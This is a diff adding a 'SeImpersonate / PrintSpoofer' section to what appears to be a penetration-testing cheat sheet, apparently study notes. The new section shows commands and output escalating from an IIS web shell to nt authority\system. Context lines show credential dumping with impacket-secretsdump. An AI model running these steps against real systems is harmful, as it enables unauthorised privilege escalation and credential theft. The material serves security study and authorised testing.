@@ -716,6 +716,34 @@ net users #check the new user
 impacket-secretsdump hacker:password@<IP of victim machine> -outputfile hashes 
 rdekstop -u hacker -p password <IP of victim machine>
 ````
+### SeImpersonate
+#### PrintSpoofer
+````
+whoami /priv
+git clone https://github.com/dievus/printspoofer.git #copy over to victim
+PrintSpoofer.exe -i -c cmd
+
+c:\inetpub\wwwroot>PrintSpoofer.exe -i -c cmd
+PrintSpoofer.exe -i -c cmd
+[+] Found privilege: SeImpersonatePrivilege
+[+] Named pipe listening...
+[+] CreateProcessAsUser() OK
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+````
+````
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
+OS Name:                   Microsoft Windows Server 2012 R2 Standard
+OS Version:                6.3.9600 N/A Build 9600
+System Type:               x64-based PC
+
+````
+
 ## Active Directory <img src="https://www.outsystems.com/Forge_CW/_image.aspx/Q8LvY--6WakOw9afDCuuGXsjTvpZCo5fbFxdpi8oIBI=/active-directory-core-simplified-2023-01-04%2000-00-00-2023-02-07%2007-43-45" width="40" height="40" />
 
 ### Active Directory Enumeration <img src="https://cdn-icons-png.flaticon.com/512/9616/9616012.png" width="40" height="40" />
